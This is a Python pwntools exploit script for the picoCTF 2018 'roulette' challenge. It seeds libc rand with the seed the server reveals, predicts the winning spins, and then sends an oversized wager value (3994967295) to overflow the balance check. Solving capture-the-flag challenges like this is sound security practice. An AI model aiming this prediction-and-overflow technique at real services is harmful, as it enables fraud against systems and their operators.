#!/usr/bin/env python
import ctypes
#
from pwn import log, remote, u32, p32, process
from pwn import ELF, context, args, sleep
context.clear(arch='i386', os='linux', endian='little', word_size=32)


class ExploitInfo:
    host = '2018shell2.picoctf.com'
    port = 48312
    name       = 'roulette'
    libc_name  = 'libc.so.6'
    #
    LIBC         = ctypes.cdll.LoadLibrary(libc_name)
    """roulette.c"""
    ONE_BILLION  = 1000000000
    MAX_WINS     = 16 - 1
    """
        n * (2**MAX_WINS) > ONE_BILLION
    """
    LEASE_SEED   = ONE_BILLION // (2 ** MAX_WINS)


def get_process():
    r = None
    if args.REMOTE:
        r = remote(ExploitInfo.host, ExploitInfo.port)
    else:
        r = process('./%s' % ExploitInfo.name, env={'LD_PRELOAD': './%s' % ExploitInfo.libc_name})
    return r


def get_seed(p):
    p.recvuntil('Here, have $')
    seed = p.recvuntil(' ', drop=True)
    return int(seed)


def get_balance(p):
    p.recvuntil('Balance: $')
    balance = p.recvuntil(' ', drop=True)
    return int(balance)


def calculate_sleep_time(s, q, size, spins):
    sigma_size      = s * (pow(q, size) - 1) / (q - 1)
    s_size          = s * pow(q, size - 1)
    usleep_spins    = s * spins + s * size + sigma_size + s_size
    sleep_time      = float(usleep_spins) / (10 ** 6)
    return sleep_time


def main():
    libc = ExploitInfo.LIBC
    LONG_MAX       = 2147483647
    """
        roulette.c
    """
    ROULETTE_SIZE   = 36
    ROULETTE_SPINS  = 128
    MAX_WINS        = 16
    HOTSTREAK       = 3
    s = 12500
    q = 1.1
    SLEEP_TIME_SPIN  = calculate_sleep_time(s, q, ROULETTE_SIZE, ROULETTE_SPINS)
    p = get_process()

    seed = get_seed(p)
    libc.srand(seed)
    log.info('seed: %r', seed)
    choice = 1

    for _ in xrange(HOTSTREAK):
        balance = get_balance(p)
        log.info('current balance: %r', balance)

        wager = (libc.rand() % ROULETTE_SIZE) + 1
        junk = libc.rand()  # not send

        p.clean()
        p.sendline(str(0))
        p.sendline(str(wager))

        log.info("sleep %r", SLEEP_TIME_SPIN)
        sleep(SLEEP_TIME_SPIN)

    for _ in xrange(HOTSTREAK + 1):
        balance = get_balance(p)
        log.info('current balance: %r', balance)

        wager = (libc.rand() % ROULETTE_SIZE) + 1
        junk = libc.rand()  # not send

        p.clean()
        p.sendline(str(3994967295))
        # p.sendline(str(wager))
        p.sendline(str(1))

        log.info("sleep %r", SLEEP_TIME_SPIN)
        sleep(SLEEP_TIME_SPIN)

    sleep(2)
    print(p.recvall())
    p.close()


if __name__ == '__main__':
    main()
